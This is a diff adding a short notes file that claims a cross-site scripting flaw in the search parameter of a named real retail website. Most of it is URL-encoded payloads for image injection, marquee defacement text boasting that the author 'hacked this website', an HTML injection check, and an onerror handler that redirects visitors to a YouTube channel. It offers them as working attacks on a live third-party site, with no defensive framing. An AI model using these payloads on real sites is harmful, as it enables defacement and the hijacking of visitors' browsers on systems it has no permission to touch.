@@ -1,0 +1,24 @@
+                         XSS Bypass by Url Encoding
+
+Vulnerble : https://www.nobullproject.com/collections/shop?q=
+
+XSS with Image Injection :)
+
+%3Cimg%20src%3Dhttps%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%20%3E
+
+%3Cmarquee%3E%3Cimg%20src%3D%22https%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%22%20alt%3D%22GIF%22%3E%20Rohit%20is%20the%20real%20Mr.%20Robot%3C%2Fmarquee%3E%0D%0A
+
+Adding Marquee tag :)
+
+%3Cmarquee%3ERohit%20hacked%20this%20website%20using%20xss%3C%2Fmarquee%3E
+
+%3Cmarquee%20style%3D%22font-family%3A%20%27Hack%27%2C%20monospace%3B%20color%3A%20green%3B%22%3ERohit%20hacked%20this%20website%20using%20XSS%3C%2Fmarquee%3E%0D%0A
+
+To check HTMLI --> <i>test</i>
+
+open redirect 
+
+%3Cimg%20src%3Dx%20onerror%3D%22window.location.href%3D%27https%3A%2F%2Fwww.youtube.com%2F%40hackwithrohit-new-2k%27%3B%22%3E%0D%0A%0D%0A
+
+
+https://dencode.com/en/  
